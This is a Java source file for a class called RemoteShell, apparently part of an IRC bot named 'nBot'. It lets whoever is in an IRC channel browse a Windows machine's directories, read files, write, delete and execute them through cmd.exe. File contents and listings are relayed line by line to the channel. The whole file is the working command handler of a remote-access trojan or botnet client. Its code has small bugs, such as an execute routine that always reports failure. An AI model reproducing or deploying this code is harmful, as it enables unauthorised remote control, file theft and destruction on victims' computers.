
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class RemoteShell implements Handler {

    public static String currentLocation = "C:\\";

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";cd")) {
            if (cd(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Cd sucsessful! Current location " + currentLocation);
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not change dir!");
                return false;
            }
        }
        if (args[0].equals(";ls")) {
            if (ls()) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " List files was sucsessful!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not list files, location not a dir?");
                return false;
            }
        }
        if (args[0].equals(";createfile")) {
            if (createFile(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " File was created!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not create file!");
                return false;
            }
        }
        if (args[0].equals(";readcontents")) {
            if (readContents(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Contents have been read!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not read contents of " + args[1]);
                return false;
            }
        }
        if (args[0].equals(";..")) {
            if (goUp()) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Up dir, location is " + currentLocation);
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not go up a dir, at root?");
                return false;
            }
        }
        if (args[0].equals(";shellexec")) {
            if (execute(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " File was executed!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not execute file!");
                return false;
            }
        }
        if (args[0].equals(";shelldelete")) {
            if (deleteFile(args[1])) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " File was deleted!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not delete file!");
                return false;
            }
        }
        if (args[0].equals(";writetofile")) {
            if (writeFile(args[1], args[2], Boolean.valueOf(args[3]))) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " String written to " + args[1] + " sucsessfully!");
                return true;
            } else {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not write to file!");
                return false;
            }
        }
        if (args[0].equals(";getlocation")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Current location " + currentLocation);
            return true;
        }
        return false;
    }

    public static boolean cd(String dir) {
        try {
            if (new File(currentLocation).exists()) {
                String[] dirs = null;
                if (dir.contains("/")) {
                    dirs = dir.split("/");
                } else if (dir.contains("\\")) {
                    dirs = dir.split("\\");
                } else if (dir.contains("//")) {
                    dirs = dir.split("//");
                } else if (dir.contains("\\\\")) {
                    dirs = dir.split("\\\\");
                } else {
                    dirs = new String[]{dir};
                }
                for (String s : dirs) {
                    currentLocation = currentLocation + "\\" + s;
                }
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean ls() {
        try {
            File file = new File(currentLocation);
            if (!file.exists() || !file.isDirectory()) {
                return false;
            } else {
                File[] files = file.listFiles();
                for (File s : files) {
                    IRC.sendMessage(Config.channel, s.getName());
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean createFile(String toCreate) {
        File file = new File(currentLocation + "//" + toCreate);
        try {
            if (file.exists()) {
                file.delete();
            }
            file.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean readContents(String toRead) {
        File file = new File(currentLocation + "//" + toRead);
        if (file.length() <= 1048576) {
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                int lineNumber = 1;
                while ((line = br.readLine()) != null) {
                    IRC.sendMessage(Config.channel, "Line " + lineNumber + ": " + line);
                    lineNumber++;
                }
            } catch (IOException e) {
                e.printStackTrace();
                return false;
            }
        }
        return true;
    }

    public static boolean writeFile(String toWrite, String put, boolean append) {
        try {
            File file = new File(currentLocation + "\\" + toWrite);
            BufferedWriter bw = new BufferedWriter(new FileWriter(file, append));
            bw.write(put);
            bw.close();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean goUp() {
        try {
            File file = new File(currentLocation);
            currentLocation = file.getParent();
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean execute(String toExecute) {
        File file = new File(currentLocation + "//" + toExecute);
        try {
            if (file.isFile()) {
                Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", currentLocation + "//" + toExecute});
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return false;
    }

    public static boolean deleteFile(String toDelete) {
        try {
            File file = new File(toDelete);
            if (!file.exists()) {
                return false;
            }
            file.delete();
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }
}
